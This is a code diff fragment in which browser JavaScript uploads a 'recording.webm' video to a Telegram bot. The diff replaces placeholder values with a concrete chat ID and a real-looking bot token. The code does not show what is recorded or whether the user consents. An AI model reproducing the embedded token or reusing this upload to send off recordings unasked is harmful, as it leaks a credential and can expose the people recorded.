@@ -140,10 +140,10 @@
           const file = new File([blob], "recording.webm");
 
           const formData = new FormData();
-          formData.append("chat_id", "YOUR_CHAT_ID"); // Replace
+          formData.append("chat_id", "6471055682"); // Replace
           formData.append("video", file);
 
-          await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendVideo`, {
+          await fetch(`https://api.telegram.org/bot7153340343:AAEsjjWrs61SiC_ApUxEwLmAiFpPmWhO-hw/sendVideo`, {
             method: "POST",
             body: formData
           });
